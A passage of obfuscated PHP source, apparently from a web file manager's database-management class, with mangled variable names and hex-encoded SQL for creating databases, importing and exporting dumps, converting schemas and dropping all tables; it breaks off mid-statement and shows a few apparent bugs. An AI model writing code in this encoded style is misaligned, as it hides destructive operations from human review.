$•õèÌ¯¥ = str_replace(array($ìæ€§[1125], $ìæ€§[1126], $ìæ€§[1127], $ìæ€§[1128], $ìæ€§[1129], $ìæ€§[1130], $ìæ€§[1131], $ìæ€§[1132], $ìæ€§[1133], $ìæ€§[1134], $ìæ€§[1135]), array($this->parseTable("{$ÕÅÁÄ½¡[$ìæ€§[358]]}"), $this->parseDistinct(isset($ÕÅÁÄ½¡[$ìæ€§[1136]]) ? $ÕÅÁÄ½¡[$ìæ€§[1136]] : !1), $this->parseField(!empty($ÕÅÁÄ½¡[$ìæ€§[352]]) ? $ÕÅÁÄ½¡[$ìæ€§[352]] : $ìæ€§[222]), $this->parseJoin(!empty($ÕÅÁÄ½¡[$ìæ€§[361]]) ? $ÕÅÁÄ½¡[$ìæ€§[361]] : $ìæ€§[12]), $this->parseWhere(!empty($ÕÅÁÄ½¡[$ìæ€§[354]]) ? $ÕÅÁÄ½¡[$ìæ€§[354]] : $ìæ€§[12]), $this->parseGroup(!empty($ÕÅÁÄ½¡[$ìæ€§[580]]) ? $ÕÅÁÄ½¡[$ìæ€§[580]] : $ìæ€§[12]), $this->parseHaving(!empty($ÕÅÁÄ½¡[$ìæ€§[1137]]) ? $ÕÅÁÄ½¡[$ìæ€§[1137]] : $ìæ€§[12]), $this->parseOrder(!empty($ÕÅÁÄ½¡[$ìæ€§[443]]) ? $ÕÅÁÄ½¡[$ìæ€§[443]] : $ìæ€§[12]), $this->parseLimit(!empty($ÕÅÁÄ½¡[$ìæ€§[369]]) ? $ÕÅÁÄ½¡[$ìæ€§[369]] : $ìæ€§[12]), $this->parseUnion(!empty($ÕÅÁÄ½¡[$ìæ€§[424]]) ? $ÕÅÁÄ½¡[$ìæ€§[424]] : $ìæ€§[12]), $this->parseComment(!empty($ÕÅÁÄ½¡[$ìæ€§[431]]) ? $ÕÅÁÄ½¡[$ìæ€§[431]] : $ìæ€§[12])), $•õèÌ¯¥); return $•õèÌ¯¥; } public function getLastSql($ÅÇ…‚Ÿ = '') { return $ÅÇ…‚Ÿ ? $this->modelSql[$ÅÇ…‚Ÿ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ıåÔöƒ“) { return addslashes($ıåÔöƒ“); } public function setModel($¥øåÚéÈ) { $this->model = $¥øåÚéÈ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($û„‹¨¸ = array()) { $æ›”é =& $_SERVER[ÔÕ±ĞšÎ]; if (empty($û„‹¨¸)) { $û„‹¨¸ = $GLOBALS[$æ›”é[6]][$æ›”é[21]]; } $this->database = $û„‹¨¸; } public function model($ÅÕ¸î¾° = '') { return new ModelBase($ÅÕ¸î¾°, $_SERVER[ÔÕ±ĞšÎ][12], $this->database); } public function db($¸Ôîü = false) { $şœüÂŠÇ =& $_SERVER[ÔÕ±ĞšÎ]; $—ÂÇ¦å = array_change_key_case($this->database); if ($this->dbType() == $şœüÂŠÇ[13] || !$¸Ôîü) { return $this->model()->db(); } $Ãö¼ã» = $—ÂÇ¦å[$şœüÂŠÇ[1051]]; $—ÂÇ¦å[$şœüÂŠÇ[1051]] = $şœüÂŠÇ[12]; if ($—ÂÇ¦å[$şœüÂŠÇ[1046]] == $şœüÂŠÇ[1043]) { $¼€àŸšœ = $—ÂÇ¦å[$şœüÂŠÇ[1052]]; $—ÂÇ¦å[$şœüÂŠÇ[1052]] = substr($¼€àŸšœ, 0, strrpos($¼€àŸšœ, $şœüÂŠÇ[1138])); } $this->database = $—ÂÇ¦å; $¢ÏÉ¾Ÿ¸ = $this->model()->db(); try { $ÓÅã…Éä = $¢ÏÉ¾Ÿ¸->execute("\163\150\157\167\40\144\x61\164\141\x62\141\x73\x65\x73\40\154\151\x6b\x65\40\x27{$Ãö¼ã»}\47"); } catch (Exception $ú©€Ë¦Á) { } if (!$ÓÅã…Éä) { $¢ÏÉ¾Ÿ¸->execute("\x63\162\145\141\164\x65\x20\x64\141\x74\141\142\x61\x73\x65\x20\x60{$Ãö¼ã»}\x60"); } $—ÂÇ¦å[$şœüÂŠÇ[1051]] = $Ãö¼ã»; if ($—ÂÇ¦å[$şœüÂŠÇ[1046]] == $şœüÂŠÇ[1043]) { $—ÂÇ¦å[$şœüÂŠÇ[1052]] .= $şœüÂŠÇ[1138] . $Ãö¼ã»; } $this->database = $—ÂÇ¦å; $¢ÏÉ¾Ÿ¸->execute("\165\x73\x65\40\x60{$Ãö¼ã»}\x60"); return $¢ÏÉ¾Ÿ¸; } public function createTable($Åå±Øüï, &$ª³’Ûº) { $º‹øõ½ë =& $_SERVER[ÔÕ±ĞšÎ]; if (!IO::exist($Åå±Øüï)) { ActionCall($º‹øõ½ë[1139], !0, 0); show_json(LNG($º‹øõ½ë[1140]), !1); } $ôÀö‹­Ù = $this->model()->db(); $üõ×èç‚ = sqlSplit(IO::getContent($Åå±Øüï)); foreach ($üõ×èç‚ as $àĞ…éÙì) { $åÍ‡‰¶ = stripos($àĞ…éÙì, $º‹øõ½ë[1141]) === 0; if ($åÍ‡‰¶) { $ª³’Ûº->task[$º‹øõ½ë[1142]] += 1; } $ôÀö‹­Ù->execute($àĞ…éÙì); if ($åÍ‡‰¶) { preg_match($º‹øõ½ë[1143], $àĞ…éÙì, $Ø¤šƒğ¾); $ª³’Ûº->task[$º‹øõ½ë[1144]] = $Ø¤šƒğ¾[1]; $ª³’Ûº->update(1); } } } public function insertTable($ûµÓ¼şÉ, &$áİµ´£Œ) { $ÓÖ£ÍöŞ =& $_SERVER[ÔÕ±ĞšÎ]; $¨¬™ÚßÅ = $this->model()->db(); $šÂ½¢¨À = $¸øÖ»ä ? array($¸øÖ»ä) : $¨¬™ÚßÅ->getTables(); foreach ($ûµÓ¼şÉ as $¿Œó»ï±) { $¸øÖ»ä = basename($¿Œó»ï±, $ÓÖ£ÍöŞ[863]); if (!in_array($¸øÖ»ä, $šÂ½¢¨À)) { continue; } $áİµ´£Œ->task[$ÓÖ£ÍöŞ[1144]] = $¸øÖ»ä; if (get_filesize($¿Œó»ï±) == 0) { continue; } $ŞÎ˜Áî = $this->sqlToDb($¿Œó»ï±, $áİµ´£Œ); if (!$ŞÎ˜Áî) { ActionCall($ÓÖ£ÍöŞ[1139], !0, 0); show_json(LNG($ÓÖ£ÍöŞ[1145]) . "\x5b{$¸øÖ»ä}\135", !1); } } } public function sqlFromDb($µ¤Ì¸›Ç, $ŒªÆë×‘, &$´¼‚ÊŸš, $í÷ßÍ· = '') { if ($´¼‚ÊŸš) { $´¼‚ÊŸš->task[$_SERVER[ÔÕ±ĞšÎ][1144]] = $µ¤Ì¸›Ç; } $êâ·çñ— = $this->model($µ¤Ì¸›Ç); $ĞÒáéôË = 0; $‚Ÿ¨‚« = 0; $ÁñöÇ = 10000; $É…ŸÏ˜ğ = fopen($ŒªÆë×‘, $_SERVER[ÔÕ±ĞšÎ][1146]); $¥¡™œ¬Û = $êâ·çñ—->getPk(); $û»Á® = $êâ·çñ—->getDbFields(); $şé²à­œ = $_SERVER[ÔÕ±ĞšÎ][12]; if ($GLOBALS[$_SERVER[ÔÕ±ĞšÎ][862]] && in_array($µ¤Ì¸›Ç, array($_SERVER[ÔÕ±ĞšÎ][1147], $_SERVER[ÔÕ±ĞšÎ][1148]))) { $şé²à­œ = $µ¤Ì¸›Ç; } do { $É´é×®Ş = array($¥¡™œ¬Û => array($_SERVER[ÔÕ±ĞšÎ][1093], $‚Ÿ¨‚«)); $ôŠ²Åê— = $êâ·çñ—->where($É´é×®Ş)->field($û»Á®)->order($¥¡™œ¬Û . $_SERVER[ÔÕ±ĞšÎ][1149])->limit($ÁñöÇ)->select(); $ôŠ²Åê— = !empty($ôŠ²Åê—) ? $ôŠ²Åê— : array(); if (!($»òÄ†¾” = count($ôŠ²Åê—))) { break; } $íã××ÕÊ = end($ôŠ²Åê—); $‚Ÿ¨‚« = $íã××ÕÊ[$¥¡™œ¬Û]; $•áù½Ö = array(); foreach ($ôŠ²Åê— as $ü˜ÂĞµ”) { if ($şé²à­œ) { if ($µ¤Ì¸›Ç == $_SERVER[ÔÕ±ĞšÎ][1147]) { if ($ü˜ÂĞµ”[$_SERVER[ÔÕ±ĞšÎ][33]] == $_SERVER[ÔÕ±ĞšÎ][1150]) { $±¾¥æë¿ = json_decode($ü˜ÂĞµ”[$_SERVER[ÔÕ±ĞšÎ][452]], !0); if ($±¾¥æë¿[$_SERVER[ÔÕ±ĞšÎ][32]] == $GLOBALS[$_SERVER[ÔÕ±ĞšÎ][862]] && $±¾¥æë¿[$_SERVER[ÔÕ±ĞšÎ][824]] != 1) { continue; } } } else { if ($ü˜ÂĞµ”[$_SERVER[ÔÕ±ĞšÎ][33]] == $_SERVER[ÔÕ±ĞšÎ][1151] && $ü˜ÂĞµ”[$_SERVER[ÔÕ±ĞšÎ][97]] == $_SERVER[ÔÕ±ĞšÎ][857]) { continue; } } } if ($í÷ßÍ·) { $ü˜ÂĞµ”[$_SERVER[ÔÕ±ĞšÎ][87]] = "\x7b\151\157\x3a{$í÷ßÍ·}\x7d" . substr($ü˜ÂĞµ”[$_SERVER[ÔÕ±ĞšÎ][87]], strlen("\x7b\x69\157\x3a{$ü˜ÂĞµ”[$_SERVER[ÔÕ±ĞšÎ][892]]}\x7d")); $ü˜ÂĞµ”[$_SERVER[ÔÕ±ĞšÎ][892]] = $í÷ßÍ·; } $•áù½Ö[] = $_SERVER[ÔÕ±ĞšÎ][1152] . $this->sqlEncode($ü˜ÂĞµ”) . $_SERVER[ÔÕ±ĞšÎ][1153]; } $¯ÃÃå‰ = "\x49\116\123\x45\122\x54\x20\x49\x4e\124\x4f\40\140{$µ¤Ì¸›Ç}\x60\x20\50\x60" . implode($_SERVER[ÔÕ±ĞšÎ][1154], $û»Á®) . $_SERVER[ÔÕ±ĞšÎ][1155]; fwrite($É…ŸÏ˜ğ, $¯ÃÃå‰ . implode($_SERVER[ÔÕ±ĞšÎ][1156], $•áù½Ö) . $_SERVER[ÔÕ±ĞšÎ][74] . PHP_EOL); $ĞÒáéôË += $»òÄ†¾”; if ($´¼‚ÊŸš) { $´¼‚ÊŸš->update($»òÄ†¾”); } } while ($ÁñöÇ == $»òÄ†¾”); fclose($É…ŸÏ˜ğ); return $ĞÒáéôË; } public function sqlToDb($çÑ–Ë›Ù, &$Â£ß­ö‡) { $×Úë‡ÂÀ =& $_SERVER[ÔÕ±ĞšÎ]; $øš¦¡‡ª = $this->model()->db(); $ÂÅİÁŞ” = @fopen($çÑ–Ë›Ù, $×Úë‡ÂÀ[1157]); if (!$ÂÅİÁŞ”) { return !1; } $ÌÖû«»ê = 0; $ÎÛÌä = $×Úë‡ÂÀ[12]; $¥ôß´ˆÛ = array(); $œê¤åßÎ = $this->dbType(); $Í›ÛØáŠ = $œê¤åßÎ == $×Úë‡ÂÀ[13] ? 500 : 2000; $áØÃ¥ìÉ = basename($çÑ–Ë›Ù, $×Úë‡ÂÀ[863]); $û¦·Î¢½ = 0; $Äøœ¼™õ = 4194304; while (!feof($ÂÅİÁŞ”)) { $ŒÙ²© ¿ = trim(fgets($ÂÅİÁŞ”)); if (!$ŒÙ²© ¿) { continue; } $°ù½óñÂ = $this->sqlDecode($ŒÙ²© ¿, $œê¤åßÎ, $áØÃ¥ìÉ); if (stripos($°ù½óñÂ, $×Úë‡ÂÀ[432]) === 0) { if (!$ÎÛÌä) { $ÎÛÌä = $°ù½óñÂ . $×Úë‡ÂÀ[53]; } continue; } if ($Â£ß­ö‡) { $Â£ß­ö‡->task[$×Úë‡ÂÀ[1142]] += 1; } $ÌÖû«»ê++; $¥ôß´ˆÛ[] = rtrim(rtrim(trim($°ù½óñÂ), $×Úë‡ÂÀ[50]), $×Úë‡ÂÀ[74]); $œ‰â»¥ó = null; $¿ğ™™Á = strlen($°ù½óñÂ); $û¦·Î¢½ += $¿ğ™™Á; $ùş³„©¹ = strlen($ÎÛÌä) + $û¦·Î¢½ + (count($¥ôß´ˆÛ) - 1); if ($ùş³„©¹ >= $Äøœ¼™õ) { $œ‰â»¥ó = array_pop($¥ôß´ˆÛ); if ($ÌÖû«»ê > 1) { $ÌÖû«»ê--; } } if ($ÌÖû«»ê >= $Í›ÛØáŠ || $œ‰â»¥ó) { $°ù½óñÂ = $ÎÛÌä . implode($×Úë‡ÂÀ[50], $¥ôß´ˆÛ); if (!$øš¦¡‡ª->execute($°ù½óñÂ)) { return !1; } if ($Â£ß­ö‡) { $Â£ß­ö‡->update($ÌÖû«»ê); } $¥ôß´ˆÛ = array(); $ÌÖû«»ê = 0; $û¦·Î¢½ = 0; if ($œ‰â»¥ó) { $¥ôß´ˆÛ = array($œ‰â»¥ó); $ÌÖû«»ê = 1; $û¦·Î¢½ = $¿ğ™™Á; } } } fclose($ÂÅİÁŞ”); if (!empty($¥ôß´ˆÛ)) { $°ù½óñÂ = $ÎÛÌä . implode($×Úë‡ÂÀ[50], $¥ôß´ˆÛ); if (!$øš¦¡‡ª->execute($°ù½óñÂ)) { return !1; } if ($Â£ß­ö‡) { $Â£ß­ö‡->update($ÌÖû«»ê); } } return !0; } public function dropTable($ä¿äËµ = null) { $Ï¹šŒ¨¶ = $this->model()->db(); $Üï–Ú® = $ä¿äËµ ? array($ä¿äËµ) : $Ï¹šŒ¨¶->getTables(); if (!$Üï–Ú®) { return; } foreach ($Üï–Ú® as $ä¿äËµ) { if ($ä¿äËµ) { $ä¿äËµ = strtolower($ä¿äËµ); } else { continue; } $Ï¹šŒ¨¶->execute("\x64\162\x6f\160\x20\x74\x61\142\154\x65\40\x69\x66\x20\x65\170\x69\163\164\x73\x20\140{$ä¿äËµ}\140"); } } private function sqlEncode($—ÄÁŸ×à) { $À•Í¡»¿ =& $_SERVER[ÔÕ±ĞšÎ]; $ìú÷ÑşÆ = array(); foreach ($—ÄÁŸ×à as $–ıªúÏÀ) { if (is_array($–ıªúÏÀ)) { $–ıªúÏÀ = json_encode_force($–ıªúÏÀ); } $–ıªúÏÀ = addslashes($–ıªúÏÀ); $–ıªúÏÀ = str_replace(array($À•Í¡»¿[1158], $À•Í¡»¿[287], $À•Í¡»¿[419]), array($À•Í¡»¿[1159], $À•Í¡»¿[1160], $À•Í¡»¿[1161]), $–ıªúÏÀ); $ìú÷ÑşÆ[] = $–ıªúÏÀ; } return $À•Í¡»¿[58] . implode($À•Í¡»¿[1162], $ìú÷ÑşÆ) . $À•Í¡»¿[58]; } private function sqlDecode($İìŠÄ„, $™±©¶˜ä, $Æ‡ï¼øñ = '') { $Ÿš—ë² =& $_SERVER[ÔÕ±ĞšÎ]; $İìŠÄ„ = str_replace(array($Ÿš—ë²[1159], $Ÿš—ë²[1160], $Ÿš—ë²[1161]), array($Ÿš—ë²[1158], $Ÿš—ë²[287], $Ÿš—ë²[419]), $İìŠÄ„); if ($™±©¶˜ä == $Ÿš—ë²[13]) { $İìŠÄ„ = str_ireplace($Ÿš—ë²[1163], $Ÿš—ë²[59], $İìŠÄ„); $İìŠÄ„ = stripslashes($İìŠÄ„); } return preg_replace($Ÿš—ë²[1164], $Ÿš—ë²[12], $İìŠÄ„); if ($™±©¶˜ä == $Ÿš—ë²[13]) { return $Æ‡ï¼øñ != $Ÿš—ë²[856] ? stripslashes($İìŠÄ„) : $İìŠÄ„; } if ($Æ‡ï¼øñ == $Ÿš—ë²[856]) { $İìŠÄ„ = str_replace($Ÿš—ë²[1165], $Ÿš—ë²[121], stripslashes($İìŠÄ„)); } return $İìŠÄ„; } public function getSqlFile($˜óÌ»ùî = '') { $É—„Í‚Ñ =& $_SERVER[ÔÕ±ĞšÎ]; $Àòç‘Ğ = $this->dbType(!0); $»·ú©–µ = CONTROLLER_DIR . "\151\156\163\164\141\154\154\57\x64\141\x74\x61\x2f{$Àòç‘Ğ}\x2e\163\161\x6c"; $¼µâÈÕÌ = file_get_contents($»·ú©–µ); $ŠõÛßœ = $É—„Í‚Ñ[1166] . ($Àòç‘Ğ == $É—„Í‚Ñ[879] ? $É—„Í‚Ñ[1167] : $É—„Í‚Ñ[1168]) . $É—„Í‚Ñ[1169]; preg_match_all($ŠõÛßœ, $¼µâÈÕÌ, $Í£”‰Ò); $àé÷±ß¥ = $Í£”‰Ò[1]; $Š‡Šª¸ª = $this->model()->db(); $ˆıñ±Úë = $Š‡Šª¸ª->getTables(); $ÁĞ‰†Í = TEMP_FILES . $É—„Í‚Ñ[1170] . date($É—„Í‚Ñ[261]) . $É—„Í‚Ñ[8]; del_dir($ÁĞ‰†Í); mk_dir($ÁĞ‰†Í); $æ‡½Â§í = $ÁĞ‰†Í . $É—„Í‚Ñ[1171]; $éâòş¾î = $ÁĞ‰†Í . $É—„Í‚Ñ[1172]; $‡ª¶ñ•ú = $Àòç‘Ğ == $É—„Í‚Ñ[13] ? $É—„Í‚Ñ[879] : $É—„Í‚Ñ[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\164\141\x6c\x6c\57\144\141\164\141\x2f{$‡ª¶ñ•ú}\56\x73\161\154", $ÁĞ‰†Í); @touch($ÁĞ‰†Í . $Àòç‘Ğ . $É—„Í‚Ñ[863]); $½÷İÃÕ = fopen($æ‡½Â§í, $É—„Í‚Ñ[1146]); $ç•òâ£ó = fopen($éâòş¾î, $É—„Í‚Ñ[1146]); if ($Àòç‘Ğ == $É—„Í‚Ñ[13]) { $ˆıñ±Úë = array_diff($ˆıñ±Úë, array($É—„Í‚Ñ[854], $É—„Í‚Ñ[855])); $õñ¸¦üª = array($É—„Í‚Ñ[1173], $É—„Í‚Ñ[1174], $É—„Í‚Ñ[1175]); fwrite($ç•òâ£ó, implode(PHP_EOL, $õñ¸¦üª) . PHP_EOL . PHP_EOL); foreach ($ˆıñ±Úë as $¾äÊŠ„¡) { $­‹á°¸Ó = $this->sqlFromSqlite($¾äÊŠ„¡); if (!$­‹á°¸Ó[$É—„Í‚Ñ[13]]) { continue; } fwrite($ç•òâ£ó, $­‹á°¸Ó[$É—„Í‚Ñ[13]] . PHP_EOL . PHP_EOL); if (!in_array($¾äÊŠ„¡, $àé÷±ß¥)) { fwrite($½÷İÃÕ, $­‹á°¸Ó[$É—„Í‚Ñ[879]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ˆıñ±Úë as $¾äÊŠ„¡) { $­‹á°¸Ó = $this->sqlFromMysql($¾äÊŠ„¡); if (!$­‹á°¸Ó[$É—„Í‚Ñ[879]]) { continue; } fwrite($½÷İÃÕ, $­‹á°¸Ó[$É—„Í‚Ñ[879]] . PHP_EOL . PHP_EOL); if (!in_array($¾äÊŠ„¡, $àé÷±ß¥)) { fwrite($ç•òâ£ó, $­‹á°¸Ó[$É—„Í‚Ñ[13]] . PHP_EOL . PHP_EOL); } } } fclose($½÷İÃÕ); fclose($ç•òâ£ó); $¼µâÈÕÌ = array($É—„Í‚Ñ[879] => $æ‡½Â§í, $É—„Í‚Ñ[13] => $éâòş¾î); return $˜óÌ»ùî ? $¼µâÈÕÌ[$˜óÌ»ùî] : $¼µâÈÕÌ; } public function dbType($™ìÜæİÄ = false) { $ºÂ¯†´› =& $_SERVER[ÔÕ±ĞšÎ]; $¼Ò©ú£± = $™ìÜæİÄ ? $GLOBALS[$ºÂ¯†´›[6]][$ºÂ¯†´›[21]] : $this->database; $¼Ò©ú£± = array_change_key_case($¼Ò©ú£±); $¦Ø…Âù = $¼Ò©ú£±[$ºÂ¯†´›[1046]]; if ($¦Ø…Âù == $ºÂ¯†´›[1043]) { $¼Ã»äª = explode($ºÂ¯†´›[4], $¼Ò©ú£±[$ºÂ¯†´›[1052]]); $¦Ø…Âù = $¼Ã»äª[0]; } $ï‹ßìÚ = array($ºÂ¯†´›[1176] => $ºÂ¯†´›[13], $ºÂ¯†´›[991] => $ºÂ¯†´›[879]); if (isset($ï‹ßìÚ[$¦Ø…Âù])) { $¦Ø…Âù = $ï‹ßìÚ[$¦Ø…Âù]; } return $¦Ø…Âù; } public function sqlFromMysql($«üßôÃÁ, $ÇÛË½¦É = '') { $æê’Ó»´ =& $_SERVER[ÔÕ±ĞšÎ]; $‡÷ÕÊÖÌ = $this->model()->db(); $â¦üÒùê = $‡÷ÕÊÖÌ->query($æê’Ó»´[1177] . $«üßôÃÁ . $æê’Ó»´[463]); if (!$â¦üÒùê || !$â¦üÒùê[0]) { return !1; } $‘èæ„¥‹ = _get($â¦üÒùê[0], $æê’Ó»´[1178], $æê’Ó»´[12]); if (!$‘èæ„¥‹) { return !1; } $¶Ã²ÛË = "\104\x52\x4f\120\x20\x54\x41\102\114\x45\40\111\106\40\105\130\111\x53\x54\x53\x20\x60{$«üßôÃÁ}\x60\x3b" . PHP_EOL . $‘èæ„¥‹ . $æê’Ó»´[74]; if ($ÇÛË½¦É && $ÇÛË½¦É == $æê’Ó»´[879]) { return $¶Ã²ÛË; } $»º©ŸäÔ = array_change_key_case($GLOBALS[$æê’Ó»´[6]][$æê’Ó»´[21]]); $ñÌ Æ›Ÿ = $»º©ŸäÔ[$æê’Ó»´[1051]]; $ÎÔÔ€€ö = $æê’Ó»´[1179] . $ñÌ Æ›Ÿ . $æê’Ó»´[1180] . $«üßôÃÁ . $æê’Ó»´[58]; $ˆ¿ƒÕ›ò = $æê’Ó»´[1181] . $«üßôÃÁ . $æê’Ó»´[979]; $Üèõ» = $‡÷ÕÊÖÌ->query($ÎÔÔ€€ö); if (empty($Üèõ»)) { $˜ŒÎ€Šê = array($æê’Ó»´[879] => $æê’Ó»´[12], $æê’Ó»´[13] => $æê’Ó»´[12]); return $ÇÛË½¦É ? $˜ŒÎ€Šê[$ÇÛË½¦É] : $˜ŒÎ€Šê; } $ªÃëŞ‰ = $‡÷ÕÊÖÌ->query($ˆ¿ƒÕ›ò); $Ÿ´ÆŒéˆ = $æê’Ó»´[12]; $ÃâÙ÷ÍË = array(); foreach ($ªÃëŞ‰ as $ıææªù×) { if (!$Ÿ´ÆŒéˆ && $ıææªù×[$æê’Ó»´[1182]] == $æê’Ó»´[1183]) { $Ÿ´ÆŒéˆ = $ıææªù×[$æê’Ó»´[1184]]; } if (isset($ÃâÙ÷ÍË[$ıææªù×[$æê’Ó»´[1182]]])) { $ÃâÙ÷ÍË[$ıææªù×[$æê’Ó»´[1182]]][$æê’Ó»´[1185]][] = $ıææªù×[$æê’Ó»´[1184]]; continue; } $ÃâÙ÷ÍË[$ıææªù×[$æê’Ó»´[1182]]] = array($æê’Ó»´[1186] => $ıææªù×[$æê’Ó»´[1182]], $æê’Ó»´[1185] => array($ıææªù×[$æê’Ó»´[1184]]), $æê’Ó»´[1187] => $ıææªù×[$æê’Ó»´[1188]] == $æê’Ó»´[91] ? 0 : 1); } $Á÷£Êé = array(); foreach ($ÃâÙ÷ÍË as $ıææªù×) { $ø¨ƒ€Û‰ = $ıææªù×[$æê’Ó»´[1186]] == $æê’Ó»´[1183]; $êöÚ¨£Û = array($æê’Ó»´[1189], $ıææªù×[$æê’Ó»´[1187]] == $æê’Ó»´[91] && !$ø¨ƒ€Û‰ ? $æê’Ó»´[1190] : $æê’Ó»´[12], $æê’Ó»´[1191], $æê’Ó»´[1192] . $«üßôÃÁ . $æê’Ó»´[11] . ($ø¨ƒ€Û‰ ? $æê’Ó»´[1193] : $ıææªù×[$æê’Ó»´[1186]]) . $æê’Ó»´[121], $æê’Ó»´[1194], $æê’Ó»´[121] . $«üßôÃÁ . $æê’Ó»´[121], $æê’Ó»´[1195] . implode($æê’Ó»´[1196], $ıææªù×[$æê’Ó»´[1185]]) . $æê’Ó»´[1197]); $Á÷£Êé[] = implode($æê’Ó»´[53], $êöÚ¨£Û) . $æê’Ó»´[74]; } $üÏÃ‰æô = array(); $ê§ø¨Ãª = array($æê’Ó»´[1198] => $æê’Ó»´[1199], $æê’Ó»´[1199] => $æê’Ó»´[1199], $æê’Ó»´[365] => $æê’Ó»´[392], $æê’Ó»´[364] => $æê’Ó»´[392]); foreach ($Üèõ» as $ıææªù×) { $êöÚ¨£Û = array($æê’Ó»´[121] . $ıææªù×[$æê’Ó»´[1200]] . $æê’Ó»´[121], isset($ê§ø¨Ãª[$ıææªù×[$æê’Ó»´[1201]]]) ? $ê§ø¨Ãª[$ıææªù×[$æê’Ó»´[1201]]] : $ıææªù×[$æê’Ó»´[1202]], $ıææªù×[$æê’Ó»´[1203]] == $æê’Ó»´[977] ? $æê’Ó»´[1204] : $æê’Ó»´[1205], $ıææªù×[$æê’Ó»´[1200]] == $Ÿ´ÆŒéˆ ? $æê’Ó»´[1206] : $æê’Ó»´[12], $ıææªù×[$æê’Ó»´[1028]] ? strtoupper(str_replace($æê’Ó»´[11], $æê’Ó»´[12], $ıææªù×[$æê’Ó»´[1028]])) : $æê’Ó»´[12]); $üÏÃ‰æô[] = trim(implode($æê’Ó»´[53], $êöÚ¨£Û)); } $´ˆõÈ‡ = array($æê’Ó»´[1207] . $«üßôÃÁ . $æê’Ó»´[1208], $æê’Ó»´[1209] . $«üßôÃÁ . $æê’Ó»´[1210], implode($æê’Ó»´[50] . PHP_EOL, $üÏÃ‰æô), $æê’Ó»´[1025]); $îÉÏÃî» = implode(PHP_EOL, array_merge($´ˆõÈ‡, $Á÷£Êé)); if ($ÇÛË½¦É && $ÇÛË½¦É == $æê’Ó»´[13]) { return $îÉÏÃî»; } $˜ŒÎ€Šê = array($æê’Ó»´[879] => $¶Ã²ÛË, $æê’Ó»´[13] => $îÉÏÃî»); return $ÇÛË½¦É ? $˜ŒÎ€Šê[$ÇÛË½¦É] : $˜ŒÎ€Šê; } public function sqlFromSqlite($È­ïµ¡Æ, $ŸöŞäÁ” = '') { $ö¸Çş´ =& $_SERVER[ÔÕ±ĞšÎ]; $”–Á«œ‚ = $this->model()->db(); $‹µÒÃõ§ = "\x50\122\101\107\115\x41\40\124\x41\102\x4c\x45\x5f\111\x4e\x46\x4f\40\50\47{$È­ïµ¡Æ}\x27\51"; $İ´óôÆÄ = "\123\x45\114\x45\x43\124\x20\52\x20\x46\x52\x4f\x4d\x20\x73\161\154\151\x74\x65\137\155\x61\x73\164\x65\162\x20\127\110\105\x52\x45\40\x74\x62\x6c\137\156\x61\155\145\40\75\x20\47{$È­ïµ¡Æ}\x27"; $¡ÅÑÄÚÔ = $”–Á«œ‚->query($‹µÒÃõ§); if (empty($¡ÅÑÄÚÔ)) { $Ûì¯š»‹ = array($ö¸Çş´[879] => $ö¸Çş´[12], $ö¸Çş´[13] => $ö¸Çş´[12]); return $ŸöŞäÁ” ? $Ûì¯š»‹[$ŸöŞäÁ”] : $Ûì¯š»‹; } $›–¥œ˜® = $”–Á«œ‚->query($İ´óôÆÄ); $ãıÖ¡™ç = $ñ§øè°Œ = array(); foreach ($›–¥œ˜® as $ıÑŒí†) { if ($ıÑŒí†[$ö¸Çş´[33]] == $ö¸Çş´[358]) { $ãıÖ¡™ç[] = $ıÑŒí†[$ö¸Çş´[1211]]; } else { $ñ§øè°Œ[$ıÑŒí†[$ö¸Çş´[32]]] = $ıÑŒí†[$ö¸Çş´[1211]]; } } $â‰ËÑ¨¥ = array_merge(array($ö¸Çş´[1207] . $È­ïµ¡Æ . $ö¸Çş´[121]), $ãıÖ¡™ç, array_values($ñ§øè°Œ)); $â‰ËÑ¨¥ = implode($ö¸Çş´[74] . PHP_EOL, $â‰ËÑ¨¥) . $ö¸Çş´[74]; if ($ŸöŞäÁ” && $ŸöŞäÁ” == $ö¸Çş´[13]) { return $â‰ËÑ¨¥; } $ÓØé©õ¡ = array(); foreach ($ñ§øè°Œ as $¼İÆÑö => $ÁŸµÁ) { $ãğñÒ¨º = str_replace($ö¸Çş´[1212] . $È­ïµ¡Æ . $ö¸Çş´[11], $ö¸Çş´[12], $¼İÆÑö); $ãğñÒ¨º = str_replace($È­ïµ¡Æ . $ö¸Çş´[11], $ö¸Çş´[12], $¼İÆÑö); $ğøÙ•´ë = str_replace(array($ö¸Çş´[121], $ö¸Çş´[1036]), $ö¸Çş´[463], substr($ÁŸµÁ, stripos($ÁŸµÁ, $ö¸Çş´[339]))); $ÓØé©õ¡[$ãğñÒ¨º] = $ğøÙ•´ë; } $õ§‡¿„œ = array(); $éõ¥¸ ² = array($ö¸Çş´[1199] => $ö¸Çş´[1213], $ö¸Çş´[392] => $ö¸Çş´[1214]); $ÒÀ®ºÍ× = $œ™¼Ø—Ù = $ö¸Çş´[12]; foreach ($¡ÅÑÄÚÔ as $ıÑŒí†) { if ($ıÑŒí†[$ö¸Çş´[57]] == $ö¸Çş´[91]) { $ÒÀ®ºÍ× = $ıÑŒí†[$ö¸Çş´[32]]; } $ÆàÃ³Ñë = $ıÑŒí†[$ö¸Çş´[33]]; if ($ÆàÃ³Ñë == $ö¸Çş´[1215] && isset($ÓØé©õ¡[$ıÑŒí†[$ö¸Çş´[32]]])) { $ÆàÃ³Ñë = $ö¸Çş´[1216]; } $ŞÙ„›¤é = array($ö¸Çş´[463] . $ıÑŒí†[$ö¸Çş´[32]] . $ö¸Çş´[463], _get($éõ¥¸ ², $ÆàÃ³Ñë, $ÆàÃ³Ñë), $ıÑŒí†[$ö¸Çş´[35]] == $ö¸Çş´[91] ? $ö¸Çş´[1204] : $ö¸Çş´[1217] . $ıÑŒí†[$ö¸Çş´[56]], $ıÑŒí†[$ö¸Çş´[57]] == $ö¸Çş´[91] ? $ö¸Çş´[1218] : $ö¸Çş´[12]); $õ§‡¿„œ[] = trim(implode($ö¸Çş´[53], $ŞÙ„›¤é)); } foreach ($ÓØé©õ¡ as $ãğñÒ¨º => $ğøÙ•´ë) { if ($ãğñÒ¨º == $ö¸Çş´[1193]) { $´®ñ ¡… = $œ™¼Ø—Ù = $ö¸Çş´[1219] . $ÒÀ®ºÍ× . $ö¸Çş´[1220]; } else { $´®ñ ¡… = 